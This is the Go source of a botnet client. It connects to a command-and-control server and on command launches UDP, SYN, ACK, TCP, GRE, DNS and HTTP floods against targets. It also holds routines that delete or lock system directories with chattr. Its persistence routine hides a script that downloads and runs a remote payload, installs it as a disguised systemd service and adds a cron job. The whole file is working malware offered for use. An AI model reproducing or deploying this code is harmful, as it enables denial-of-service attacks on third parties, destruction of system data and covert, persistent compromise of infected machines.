package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

const C2Address = "Replace IP:7002"

var (
	reconnectDelay         = 5 * time.Second
	numWorkers             = 2024
	killerEnabled          = false
	killDirectories        = []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
	whitelistedDirectories = []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
)

func main() {
	for {
		conn, err := net.Dial("tcp", C2Address)
		if err != nil {
			fmt.Printf("Error connecting to C2: %v\n", err)
			time.Sleep(reconnectDelay)
			continue
		}
		fmt.Println("Connected to C2 server. Listening for commands...")
		reader := bufio.NewReader(conn)
		for {
			command, err := reader.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					fmt.Println("Connection closed by server. Reconnecting...")
					break
				}
				fmt.Printf("Error reading command: %v\n", err)
				break
			}
			command = strings.TrimSpace(command)
			if err := handleCommand(command); err != nil {
				fmt.Printf("Failed to handle command: %v\n", err)
			}
		}
		conn.Close()
		fmt.Println("Retrying connection to C2 server...")
		time.Sleep(reconnectDelay)
	}
}

func handleCommand(command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := fields[0]
	if cmd == "PING" {
		fmt.Println("PONG")
		return nil
	}

	if cmd == "!udpflood" || cmd == "!udpsmart" || cmd == "!tcpflood" || cmd == "!synflood" || cmd == "!ackflood" || cmd == "!greflood" || cmd == "!dns" || cmd == "!http" {
		if len(fields) != 4 {
			return fmt.Errorf("invalid command format for %s", cmd)
		}

		target := fields[1]
		targetPortStr := fields[2]
		durationStr := fields[3]
		targetPort, err := strconv.Atoi(targetPortStr)

		if err != nil {
			return fmt.Errorf("invalid target port: %w", err)
		}
		duration, err := strconv.Atoi(durationStr)
		if err != nil {
			return fmt.Errorf("invalid duration: %w", err)
		}

		switch cmd {
		case "!udpflood":
			go performUDPFlood(target, targetPort, duration)
		case "!udpsmart":
			go udpsmart(target, targetPort, duration)
		case "!tcpflood":
			go TCPfloodAttack(target, targetPort, duration)
		case "!synflood":
			go performSYNFlood(target, targetPort, duration)
		case "!ackflood":
			go performACKFlood(target, targetPort, duration)
		case "!greflood":
			go performGREFlood(target, duration)
		case "!dns":
			go performDNSFlood(target, targetPort, duration)
		case "!http":
			go performHTTPFlood(target, targetPort, duration)
		}
		return nil
	}

	switch cmd {
	case "!kill":
		killerMaps()
	case "!lock":
		locker()
	case "!persist":
		SystemdPersistence()
	default:
		return fmt.Errorf("unknown command: %s", cmd)
	}

	return nil
}

// DNSResponse structure
type DNSResponse struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// CF DNS over HTTPS to resolve
func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("error resolving target: received status code %d", resp.StatusCode)
	}
	var dnsResp DNSResponse
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("error decoding DNS response: %v", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no DNS records found for target")
	}
	return dnsResp.Answer[0].Data, nil
}

// HTTP flood
func performHTTPFlood(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting HTTP flood on %s:%d for %d seconds\n", target, targetPort, duration)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	const highPacketSize = 1024
	var wg sync.WaitGroup
	resolvedIP, err := resolveTarget(target)
	if err != nil {
		fmt.Printf("Failed to resolve target: %v\n", err)
		return
	}

	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QP1A.190821.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	}
	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
		"https://www.reddit.com/",
		"https://www.github.com/",
	}
	acceptLanguages := []string{
		"en-US,en;q=0.9",
		"fr-FR,fr;q=0.9",
		"es-ES,es;q=0.9",
		"de-DE,de;q=0.9",
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				default:
					body := make([]byte, highPacketSize)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						fmt.Printf("Error creating request: %v\n", err)
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
					resp, err := client.Do(req)
					if err != nil {
						fmt.Printf("Error sending HTTP request: %v\n", err)
						continue
					}
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("HTTP flood complete. Requests sent: %d\n", atomic.LoadInt64(&requestCount))
}

// Udpsmart Flood
func udpsmart(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting randomized UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					payloadSize := rand.Intn(10000) + 25400
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err := conn.WriteTo(payload, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						fmt.Printf("Error sending packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood complete. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// UdpFlood
func performUDPFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup

	maxPayloadSize := 65507
	payload := make([]byte, maxPayloadSize)
	rand.Read(payload)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					sourcePort := rand.Intn(65535-1024) + 1024
					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: targetPort})
					if err != nil {
						fmt.Printf("Error creating UDP connection: %v\n", err)
						continue
					}
					_, err = conn.Write(payload)
					if err == nil {
						atomic.AddInt64(&packetCount, 1)
					} else {
						fmt.Printf("Error sending UDP packet: %v\n", err)
					}

					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood complete. Packets sent: %d\n", packetCount)
}

// DnsFlood
func performDNSFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting Enhanced DNS flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup

	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := constructDNSQuery(domain, queryType)
					buffer, err := dnsQuery.Pack()
					if err != nil {
						fmt.Printf("Error packing DNS query: %v\n", err)
						continue
					}
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						fmt.Printf("Error sending DNS packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("Enhanced DNS flood completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// TcpFlood
func TCPfloodAttack(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("TCP flood attack completed. Packets sent: %d\n", packetCount)
}

// SynFlood
func performSYNFlood(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())

	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("SYN flood attack completed. Packets sent: %d\n", packetCount)
}

// AckFlood
func performACKFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						ACK:        true,
						Seq:        rand.Uint32(),
						Ack:        rand.Uint32(),
						Window:     12800,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()

					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("ACK flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// GreFlood
func performGREFlood(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					greLayer := &layers.GRE{}
					maxPacketSize := 65535
					ipAndGreHeadersSize := 20 + 4
					payloadSize := maxPacketSize - ipAndGreHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting GRE packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("GRE flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// Make the a DNS query message
func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)

	// Add EDNS0 to support larger responses
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096) // Use 4096 for max payload size
	msg.Extra = append(msg.Extra, edns0)

	return msg
}

// Function to kill specific processes or clean maps
func killerMaps() {
	if !killerEnabled {
		fmt.Println("Killer functionality is disabled. Set killerEnabled to true to enable it.")
		return
	}
	fmt.Println("Running killerMaps() routine to manage process and map cleaning.")
	for _, dir := range killDirectories {
		if isWhitelisted(dir) {
			fmt.Printf("Skipping whitelisted directory: %s\n", dir)
			continue
		}
		if err := os.RemoveAll(dir); err != nil {
			fmt.Printf("Failed to clean directory %s: %v\n", dir, err)
		} else {
			fmt.Printf("Successfully cleaned directory %s\n", dir)
		}
	}
}

// Function to check if a directory is whitelisted
func isWhitelisted(dir string) bool {
	for _, whitelisted := range whitelistedDirectories {
		if dir == whitelisted {
			return true
		}
	}
	return false
}

// Function to lock systems, files, or other resources
func locker() {
	fmt.Println("Running locker() routine for system locking.")
	for _, dir := range killDirectories {
		if isWhitelisted(dir) {
			fmt.Printf("Skipping whitelisted directory: %s\n", dir)
			continue
		}
		cmd := exec.Command("chattr", "+i", dir)
		if err := cmd.Run(); err != nil {
			fmt.Printf("Failed to lock directory %s: %v\n", dir, err)
		} else {
			fmt.Printf("Successfully locked directory %s\n", dir)
		}
	}
}

// Function to stay on the device
func SystemdPersistence() {
	fmt.Println("Running hidden SystemdPersistence() routine for stealth persistence.")
	hiddenDir := "/var/lib/.systemd_helper"
	scriptPath := filepath.Join(hiddenDir, ".systemd_script.sh")
	programPath := filepath.Join(hiddenDir, ".systemd_process")
	url := "http://127.0.0.1/x86"
	err := os.MkdirAll(hiddenDir, 0755)
	if err != nil {
		fmt.Printf("Failed to create hidden directory: %v\n", err)
		return
	}
	fmt.Printf("Created hidden directory: %s\n", hiddenDir)
	scriptContent := fmt.Sprintf(`#!/bin/bash
	URL="%s"
	PROGRAM_PATH="%s"

	# Check if the program exists
	if [ ! -f "$PROGRAM_PATH" ]; then
		echo "Program not found. Downloading..."
		wget -O $PROGRAM_PATH $URL
		chmod +x $PROGRAM_PATH
	fi

	# Check if the program is running
	if ! pgrep -x ".systemd_process" > /dev/null; then
		echo "Program is not running. Starting..."
		$PROGRAM_PATH &
	else
		echo "Program is already running."
	fi
	`, url, programPath)
	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	if err != nil {
		fmt.Printf("Failed to create persistence script: %v\n", err)
		return
	}
	fmt.Printf("Successfully created hidden persistence script at %s\n", scriptPath)
	serviceContent := `[Unit]
						Description=System Helper Service
						After=network.target

						[Service]
						ExecStart=/var/lib/.systemd_helper/.systemd_script.sh
						Restart=always
						RestartSec=60
						StandardOutput=null
						StandardError=null

						[Install]
						WantedBy=multi-user.target
						`
	servicePath := "/etc/systemd/system/systemd-helper.service"
	err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		fmt.Printf("Failed to create systemd service: %v\n", err)
		return
	}
	fmt.Printf("Successfully created stealthy systemd service at %s\n", servicePath)
	cmd := exec.Command("systemctl", "enable", "--now", "systemd-helper.service")
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to enable and start service: %v\n", err)
		return
	}
	fmt.Println("Successfully enabled and started the stealth persistence service.")
	createCronJob(hiddenDir)
}

func createCronJob(hiddenDir string) {
	cronJob := fmt.Sprintf(`* * * * * bash %s/.systemd_script.sh > /dev/null 2>&1`, hiddenDir)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Failed to create cron job: %v\n", err)
		return
	}
	fmt.Println("Successfully created a cron job for backup persistence.")
}
